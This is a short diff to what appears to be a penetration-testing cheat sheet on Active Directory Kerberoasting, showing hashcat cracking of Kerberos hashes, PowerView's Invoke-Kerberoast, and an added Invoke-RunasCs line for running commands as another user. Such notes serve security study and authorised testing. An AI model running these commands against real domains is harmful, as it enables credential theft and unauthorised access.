@@ -48,6 +48,9 @@ hashcat -m 19700 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt
 
 # From PowerView
 Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
+
+# If user has no winrm access, then change with Invoke-RunasCs.ps1
+Invoke-RunasCs -Username $USER -Password $PASS -Command "whoami"
 ```
 
 ## 3.2 AS-REP Roasting
